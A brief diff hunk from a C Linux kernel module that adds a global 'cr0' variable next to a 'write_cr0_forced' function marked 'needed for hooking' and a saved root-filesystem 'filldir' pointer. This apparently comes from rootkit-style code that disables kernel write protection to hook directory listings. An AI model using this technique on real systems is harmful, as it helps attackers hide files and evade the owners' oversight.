@@ -225,6 +225,7 @@ static filldir_t org_rootfs_filldir;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,3,0)
 /* needed for hooking */
+unsigned long cr0;
 static void
 write_cr0_forced(unsigned long val)
 {
